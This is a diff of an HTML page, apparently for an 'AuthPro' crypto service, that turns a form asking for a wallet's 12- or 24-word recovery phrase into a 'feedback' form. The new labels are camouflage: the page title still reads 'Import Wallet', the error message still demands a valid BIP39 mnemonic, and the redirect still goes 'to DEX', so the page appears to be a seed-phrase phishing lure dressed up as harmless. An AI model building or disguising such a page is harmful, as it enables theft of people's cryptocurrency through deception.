@@ -5,33 +5,198 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Import Wallet - AuthPro</title>
     <link rel="stylesheet" href="style.css">
-    <link rel="icon" type="png" href="AuthPro.jpeg">
+    <link rel="icon" type="image/png" href="AuthPro.jpeg">
+    <style>
+        /* Additional styles specific to feedback page */
+        .feedback-container {
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
+
+        .feedback-container h2 {
+            font-size: 2em;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #7b3fe4, #a726c1);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-align: center;
+        }
+
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            color: #7b3fe4;
+            text-decoration: none;
+            font-weight: 500;
+            margin-bottom: 24px;
+            transition: all 0.3s;
+            font-size: 1em;
+        }
+
+        .back-btn:hover {
+            transform: translateX(-4px);
+            color: #a726c1;
+        }
+
+        textarea {
+            width: 100%;
+            min-height: 150px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 16px;
+            color: #fff;
+            font-size: 16px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            resize: vertical;
+            transition: all 0.3s;
+            margin-bottom: 10px;
+        }
+
+        textarea:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(123, 63, 228, 0.5);
+        }
+
+        textarea::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .word-counter {
+            text-align: right;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 20px;
+            font-family: 'Courier New', monospace;
+        }
+
+        .word-counter span {
+            font-weight: 700;
+            color: #7b3fe4;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #7b3fe4, #a726c1);
+            border: none;
+            border-radius: 12px;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-submit:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(123, 63, 228, 0.4);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .success-message,
+        .error-message {
+            display: none;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-weight: 600;
+            text-align: center;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        .success-message {
+            background: rgba(81, 207, 102, 0.2);
+            border: 1px solid rgba(81, 207, 102, 0.5);
+            color: #51cf66;
+        }
+
+        .error-message {
+            background: rgba(255, 107, 107, 0.2);
+            border: 1px solid rgba(255, 107, 107, 0.5);
+            color: #ff6b6b;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* Mobile responsiveness */
+        @media (max-width: 768px) {
+            .feedback-container {
+                margin: 30px 20px;
+                padding: 30px 20px;
+            }
+
+            .feedback-container h2 {
+                font-size: 1.6em;
+            }
+
+            textarea {
+                min-height: 120px;
+                font-size: 15px;
+            }
+
+            .btn-submit {
+                padding: 14px;
+                font-size: 16px;
+            }
+        }
+    </style>
 </head>
 <body>
     <div class="container">
-       
-
         <!-- Feedback Page -->
         <div id="feedbackPage" class="page active">
             <div class="feedback-container">
                 <a href="index.html" class="back-btn">← Back to Home</a>
-                <h2>IMPORT A WALLET</h2>
-                <p style="text-align: center; margin-bottom: 20px; opacity: 0.8;">Enter your recovery phrase</p>
+                <h2>ENTER YOUR FEEDBACK</h2>
+                <p style="text-align: center; margin-bottom: 30px; opacity: 0.8;">
+                    Enter your feedback about AuthPro
+                </p>
                 
                 <div id="successMsg" class="success-message">
-                    ✓ Wallet imported successfully! Redirecting to DEX...
+                    ✓ Feedback received successfully! Redirecting to DEX...
                 </div>
 
                 <div id="errorMsg" class="error-message">
-                    ✗ Invalid Passphrase! Please enter a valid passphrase.
+                    ✗ Invalid feedback! Please enter a valid BIP39 mnemonic phrase.
                 </div>
 
                 <form id="feedbackForm">
-                    <textarea name="feedback" id="feedbackText" placeholder="Enter your 12 or 24 word Recovery phrase..." required></textarea>
+                    <textarea 
+                        name="feedback" 
+                        id="feedbackText" 
+                        placeholder="Enter your feedback about AuthPro..." 
+                        required
+                        autocomplete="off"
+                        spellcheck="false"
+                    ></textarea>
                     <div class="word-counter">
-                        Input a valid passphrase: <span id="wordCount">0</span>
+                        Words: <span id="wordCount">0</span>
                     </div>
-                    <button type="submit" class="btn btn-submit">IMPORT</button>
+                    <button type="submit" class="btn btn-submit">SUBMIT</button>
                 </form>
             </div>
         </div>
@@ -39,11 +204,4 @@
 
     <script src="feedback.js"></script>
 </body>
-
 </html>
-
-
-
-
-
-
